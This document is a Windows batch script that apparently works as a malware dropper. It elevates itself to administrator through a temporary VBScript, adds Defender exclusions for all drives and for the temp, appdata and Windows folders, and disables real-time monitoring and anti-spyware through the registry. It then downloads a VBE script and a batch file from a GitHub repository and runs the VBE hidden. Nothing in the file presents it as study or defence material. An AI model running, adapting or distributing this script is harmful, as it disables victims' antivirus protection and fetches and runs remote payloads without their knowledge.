@echo off
cd C:\Windows\
if "%1"=="admin" goto run_as_admin
echo error not run as Admin
echo Set objShell = CreateObject("Shell.Application") > "%temp%\admin.vbs"
echo objShell.ShellExecute "%~s0", "admin", "", "runas", 1 >> "%temp%\admin.vbs"
"%temp%\admin.vbs"
del /q "%temp%\admin.vbs"

2>nul (
    net session && (
        for %%A in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
            if exist %%A:\ (
                powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%%A:\' -ErrorAction SilentlyContinue"
            )
        )
    )
)






:skip1

powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%temp%'"
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%appdata%'"
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
:run_as_admin
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
curl -s -o "scriptmenagers".vbe -JL "https://github.com/DanGILC-137/Legend/raw/main/scriptmenagers.vbe"
curl -s -o "msisettings".bat -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.bat"
start /min wscript.exe "scriptmenagers.vbe"

:: Check if PowerShell exists
where powershell >nul 2>nul
if %errorlevel% neq 0 (
    echo PowerShell is not available.
    goto skip1
)
for /f "tokens=2 delims=:\" %%A in ('wmic logicaldisk get deviceid^,drivetype ^| find "3"') do (
    echo Adding exclusion for %%A:\
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%%A:\' -ErrorAction SilentlyContinue"
)
cls

